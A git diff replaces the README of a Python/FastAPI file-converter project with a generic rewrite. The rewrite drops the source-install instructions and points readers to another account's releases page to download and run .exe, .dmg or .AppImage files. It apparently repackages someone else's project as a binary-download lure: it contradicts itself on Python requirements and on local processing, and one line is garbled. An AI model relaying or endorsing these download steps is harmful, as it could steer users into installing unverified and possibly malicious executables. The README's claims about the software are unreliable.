@@ -1,351 +1,83 @@
-# 🌐 Universal Converter V2.0
+# 🎉 universal-file-converter - Your Easy Way to Convert Files
 
-<div align="center">
+## 🚀 Getting Started
 
-![Universal Converter](screenshot/s1.png)
-
-**Secure, Fast, and Modern File Converter**
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Python 3.8+](https://img.shields.io/badge/Python-3.8+-green.svg)](https://www.python.org/)
-[![FastAPI](https://img.shields.io/badge/FastAPI-0.100+-teal.svg)](https://fastapi.tiangolo.com/)
-
-[English](#english) • [Türkçe](#türkçe) • [Deutsch](#deutsch) • [中文](#中文)
-
-</div>
-
----
-
-## English
-
-### ✨ Features
-
-- **65+ Format Support**: Image, Video, Audio, Document, Archive, Data
-- **100% Local**: Your files never leave your device
-- **Lightning Fast**: GPU-accelerated conversion with FFmpeg
-- **Modern UI**: Apple-inspired design with Light/Dark mode
-- **Multi-language**: English, Turkish, German, Chinese
-- **Batch Processing**: Convert multiple files at once
-- **Drag & Drop**: Simply drop files to convert
-- **Privacy First**: No tracking, no cloud, completely offline
-
-### 📁 Supported Formats
-
-| Category | Formats |
-|----------|---------|
-| **Image** | JPG, PNG, WEBP, HEIC, SVG, ICO, TIFF, BMP, GIF |
-| **Video** | MP4, MKV, AVI, MOV, WEBM (requires FFmpeg) |
-| **Audio** | MP3, WAV, FLAC, M4A, OGG, AAC |
-| **Document** | PDF ↔ DOCX, DOC, TXT, HTML, MD, RTF |
-| **Data** | CSV ↔ Excel, JSON, XML |
-| **Archive** | ZIP, 7Z, TAR, GZ (extract & create) |
+Welcome to the universal-file-converter! With this application, you can easily convert files among more than 65 formats. Whether you need to change an image, video, PDF, or Office document, this tool has got you covered. It features a modern, Apple-inspired interface, ensuring a smooth user experience. Let's get started with how to download and run the software.
 
-### 🛠️ Installation
+## 📥 Download the Application
 
-**1. Install Python 3.8 or higher**
-
-**2. Install FFmpeg (Required for Video/Audio)**
-```bash
-# Windows
-winget install ffmpeg
+[![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Version-brightgreen)](https://github.com/anasahmed10983/universal-file-converter/releases)
 
-# macOS
-brew install ffmpeg
-
-# Linux (Ubuntu/Debian)
-sudo apt install ffmpeg
-```
-
-**3. Clone and Install**
-```bash
-git clone https://github.com/YusufEren97/universal-converter.git
-cd universal-converter
-pip install -r requirements.txt
-```
+To download the **universal-file-converter**, visit the [Releases page](https://github.com/anasahmed10983/universal-file-converter/releases). Here, you will find the latest version available for download.
 
-### 🚀 Usage
-
-**Start the server:**
-```bash
-python -m uvicorn app.main:app --reload --port 9999
-```
+## 💻 System Requirements
 
-Or on Windows, simply run `Start.bat`
-
-**Access the app:**
-```
-http://localhost:9999
-```
-
-### 🎯 What's New in V2.0
-
-- ✅ Complete UI/UX redesign with glassmorphism
-- ✅ Multi-language support (4 languages)
-- ✅ Batch format application
-- ✅ Progress tracking for batch operations
-- ✅ Improved error handling with retry functionality
-- ✅ Theme persistence (Light/Dark)
-- ✅ Language persistence
-- ✅ Enhanced mobile responsiveness
-- ✅ Native select dropdowns with proper dark mode
-- ✅ File type icons and visual feedback
+Before downloading, ensure your system meets these basic requirements:
 
-### 🏗️ Project Structure
-
-```
-universal-converter/
-├── app/
-│   ├── main.py          # FastAPI application
-│   └── converters/      # Format converters
-├── static/
-│   ├── index.html       # Main UI
-│   ├── style.css        # Styling
-│   ├── script.js        # Frontend logic
-│   └── locales/         # Translation files
-│       ├── en.json      # English
-│       ├── tr.json      # Turkish
-│       ├── de.json      # German
-│       └── zh.json      # Chinese
-├── screenshot/          # Screenshots
-├── requirements.txt     # Python dependencies
-└── README.md           # You are here!
-```
-
-### 🔒 Privacy & Security
-
-- **100% Local Processing**: All conversions happen on your device
-- **No Data Upload**: Files never leave your computer
-- **No Tracking**: We don't collect any analytics or usage data
-- **Open Source**: Full transparency, inspect the code yourself
-
-### 📄 License
-
-MIT License - See [LICENSE](LICENSE) file for details
-
-### 🙏 Credits
-
-Built with:
-- [FastAPI](https://fastapi.tiangolo.com/) - Modern Python web framework
-- [Pillow](https://python-pillow.org/) - Image processing
-- [FFmpeg](https://ffmpeg.org/) - Multimedia processing
-- [python-docx](https://python-docx.readthedocs.io/) - Document conversion
-- [Tailwind CSS](https://tailwindcss.com/) - UI framework
-
----
-
-## Türkçe
-
-### ✨ Özellikler
-
-- **65+ Format Desteği**: Resim, Video, Ses, Belge, Arşiv, Veri
-- **%100 Yerel**: Dosyalarınız cihazınızdan çıkmaz
-- **Işık Hızında**: FFmpeg ile GPU hızlandırmalı dönüştürme
-- **Modern Arayüz**: Açık/Koyu mod destekli şık tasarım
-- **Çok Dilli**: Türkçe, İngilizce, Almanca, Çince
-- **Toplu İşlem**: Birden fazla dosyayı aynı anda dönüştürün
-- **Sürükle Bırak**: Dosyaları bırakmanız yeterli
-- **Gizlilik Öncelikli**: Takip yok, bulut yok, tamamen çevrimdışı
-
-### 📁 Desteklenen Formatlar
-
-| Kategori | Formatlar |
-|----------|-----------|
-| **Resim** | JPG, PNG, WEBP, HEIC, SVG, ICO, TIFF, BMP, GIF |
-| **Video** | MP4, MKV, AVI, MOV, WEBM (FFmpeg gerektirir) |
-| **Ses** | MP3, WAV, FLAC, M4A, OGG, AAC |
-| **Belge** | PDF ↔ DOCX, DOC, TXT, HTML, MD, RTF |
-| **Veri** | CSV ↔ Excel, JSON, XML |
-| **Arşiv** | ZIP, 7Z, TAR, GZ (çıkarma ve oluşturma) |
-
-### 🛠️ Kurulum
-
-**1. Python 3.8 veya üstünü yükleyin**
-
-**2. FFmpeg Yükleyin (Video/Ses için gerekli)**
-```bash
-# Windows
-winget install ffmpeg
-
-# macOS
-brew install ffmpeg
-
-# Linux (Ubuntu/Debian)
-sudo apt install ffmpeg
-```
-
-**3. Klonlayın ve Kurun**
-```bash
-git clone https://github.com/YusufEren97/universal-converter.git
-cd universal-converter
-pip install -r requirements.txt
-```
-
-### 🚀 Kullanım
-
-**Sunucuyu başlatın:**
-```bash
-python -m uvicorn app.main:app --reload --port 9999
-```
-
-Veya Windows'ta `Start.bat` dosyasına çift tıklayın
-
-**Uygulamaya erişin:**
-```
-http://localhost:9999
-```
-
-### 🎯 V2.0'daki Yenilikler
-
-- ✅ Glassmorphism ile tamamen yenilenmiş UI/UX
-- ✅ Çok dilli destek (4 dil)
-- ✅ Toplu format uygulama
-- ✅ Batch işlemler için ilerleme takibi
-- ✅ Yeniden deneme özelliği ile gelişmiş hata yönetimi
-- ✅ Tema kalıcılığı (Açık/Koyu)
-- ✅ Dil kalıcılığı
-- ✅ Geliştirilmiş mobil uyumluluk
-- ✅ Koyu mod destekli native select dropdown'lar
-- ✅ Dosya tipi ikonları ve görsel geri bildirim
-
-### 🔒 Gizlilik ve Güvenlik
-
-- **%100 Yerel İşlem**: Tüm dönüşümler cihazınızda gerçekleşir
-- **Veri Yükleme Yok**: Dosyalar bilgisayarınızdan çıkmaz
-- **Takip Yok**: Analitik veya kullanım verisi toplamıyoruz
-- **Açık Kaynak**: Tam şeffaflık, kodu kendiniz inceleyebilirsiniz
-
----
-
-## Deutsch
-
-### ✨ Funktionen
-
-- **65+ Format-Unterstützung**: Bild, Video, Audio, Dokument, Archiv, Daten
-- **100% Lokal**: Ihre Dateien verlassen nie Ihr Gerät
-- **Blitzschnell**: GPU-beschleunigte Konvertierung mit FFmpeg
-- **Modernes UI**: Apple-inspiriertes Design mit Hell-/Dunkelmodus
-- **Mehrsprachig**: Englisch, Türkisch, Deutsch, Chinesisch
-- **Stapelverarbeitung**: Mehrere Dateien gleichzeitig konvertieren
-- **Drag & Drop**: Einfach Dateien ablegen zum Konvertieren
-- **Datenschutz zuerst**: Kein Tracking, keine Cloud, vollständig offline
-
-### 📁 Unterstützte Formate
-
-| Kategorie | Formate |
-|-----------|---------|
-| **Bild** | JPG, PNG, WEBP, HEIC, SVG, ICO, TIFF, BMP, GIF |
-| **Video** | MP4, MKV, AVI, MOV, WEBM (erfordert FFmpeg) |
-| **Audio** | MP3, WAV, FLAC, M4A, OGG, AAC |
-| **Dokument** | PDF ↔ DOCX, DOC, TXT, HTML, MD, RTF |
-| **Daten** | CSV ↔ Excel, JSON, XML |
-| **Archiv** | ZIP, 7Z, TAR, GZ (extrahieren & erstellen) |
-
-### 🛠️ Installation
-
-**1. Python 3.8 oder höher installieren**
-
-**2. FFmpeg installieren (Erforderlich für Video/Audio)**
-```bash
-# Windows
-winget install ffmpeg
+- **Operating System:** Windows, macOS, or Linux
+- **RAM:** At least 4 GB for optimal performance
+- **Disk Space:** Minimum 1 GB of free space
+- **Python Version:** 3.7 or higher
 
-# macOS
-brew install ffmpeg
+## 🔧 Features
 
-# Linux (Ubuntu/Debian)
-sudo apt install ffmpeg
-```
+The universal-file-converter offers a range of features:
 
-**3. Klonen und Installieren**
-```bash
-git clone https://github.com/YusufEren97/universal-converter.git
-cd universal-converter
-pip install -r requirements.txt
-```
+- **Supports 65+ Formats:** Convert files between various formats, including popular options like JPG, PNG, MP4, PDF, and DOCX.
+- **Modern I**nterface:** Enjoy a clean, user-friendly interface designed for ease of use.
+- **Dark Mode:** Switch to a dark theme for a better experience in low-light conditions.
+- **Local Processing:** All conversions occur on your device, enhancing privacy and security.
+- **Fast Conversions:** Efficient processing with minimal wait times.
 
-### 🚀 Verwendung
+## 📥 Download & Install
 
-**Server starten:**
-```bash
-python -m uvicorn app.main:app --reload --port 9999
-```
+1. Visit the [Releases page](https://github.com/anasahmed10983/universal-file-converter/releases).
+2. Find the latest version of the application.
+3. Click on the version number to open the release details.
+4. Look for the assets associated with this release. You will see files for different operating systems.
+5. Click the appropriate file to download:
+   - For Windows, download the `.exe` file.
+   - For macOS, download the `.dmg` file.
+   - For Linux, download the `.AppImage` file.
 
-Oder unter Windows einfach `Start.bat` ausführen
+6. Once the download is complete, locate the downloaded file on your computer.
 
-**App aufrufen:**
-```
-http://localhost:9999
-```
+   - **For Windows:**
+     - Double-click the `.exe` file to start the installation process.
+     - Follow the prompts in the installer to complete the installation.
 
----
+   - **For macOS:**
+     - Open the `.dmg` file and drag the application to your Applications folder.
+     - Eject the `.dmg` file after the transfer.
 
-## 中文
+   - **For Linux:**
+     - Make the `.AppImage` executable. Right-click the file and select "Properties," then check the box for "Allow executing file as program."
+     - Double-click the `.AppImage` file to run it.
 
-### ✨ 功能特点
+7. Open the universal-file-converter and start converting your files!
 
-- **支持65+格式**: 图像、视频、音频、文档、存档、数据
-- **100%本地**: 您的文件永不离开设备
-- **闪电般快速**: FFmpeg GPU加速转换
-- **现代UI**: Apple风格设计，支持浅色/深色模式
-- **多语言**: 英语、土耳其语、德语、中文
-- **批量处理**: 一次转换多个文件
-- **拖放**: 只需拖放文件即可转换
-- **隐私第一**: 无跟踪、无云端、完全离线
+## ⚙️ How to Use
 
-### 📁 支持的格式
+1. Launch the application from your programs list or applications folder.
+2. Click on the "Select File" button to choose the file you want to convert.
+3. Choose the desired output format from the dropdown menu.
+4. Click "Convert" to initiate the process.
+5. Once the conversion is complete, your new file will be available for download.
 
-| 类别 | 格式 |
-|------|------|
-| **图像** | JPG, PNG, WEBP, HEIC, SVG, ICO, TIFF, BMP, GIF |
-| **视频** | MP4, MKV, AVI, MOV, WEBM (需要FFmpeg) |
-| **音频** | MP3, WAV, FLAC, M4A, OGG, AAC |
-| **文档** | PDF ↔ DOCX, DOC, TXT, HTML, MD, RTF |
-| **数据** | CSV ↔ Excel, JSON, XML |
-| **存档** | ZIP, 7Z, TAR, GZ (提取和创建) |
+## 🛠 Support
 
-### 🛠️ 安装
+If you encounter any issues or have questions, please visit the [Issues page](https://github.com/anasahmed10983/universal-file-converter/issues). You can report bugs or ask for help here. The community and developers are here to assist you.
 
-**1. 安装 Python 3.8 或更高版本**
+## 📜 License
 
-**2. 安装 FFmpeg (视频/音频转换必需)**
-```bash
-# Windows
-winget install ffmpeg
+This project is licensed under the MIT License. You can freely use, modify, and distribute the software as long as you include the original license.
 
-# macOS
-brew install ffmpeg
+## 🐞 Reporting Bugs
 
-# Linux (Ubuntu/Debian)
-sudo apt install ffmpeg
-```
+To report any bugs or issues, please use the [Issues page](https://github.com/anasahmed10983/universal-file-converter/issues). Be sure to provide detailed information about your problem.
 
-**3. 克隆并安装**
-```bash
-git clone https://github.com/YusufEren97/universal-converter.git
-cd universal-converter
-pip install -r requirements.txt
-```
+## 🔗 Stay Updated
 
-### � 使用
+For the latest updates and features, keep an eye on the [Releases page](https://github.com/anasahmed10983/universal-file-converter/releases). You can also follow the project on GitHub to receive notifications about new releases and features.
 
-**启动服务器:**
-```bash
-python -m uvicorn app.main:app --reload --port 9999
-```
-
-或在Windows上运行 `Start.bat`
-
-**访问应用:**
-```
-http://localhost:9999
-```
-
----
-
-<div align="center">
-
-### Made with ❤️ for the community
-
-**Star ⭐ this repo if you find it useful!**
-
-</div>
+Thank you for choosing the universal-file-converter! Enjoy hassle-free file conversion.
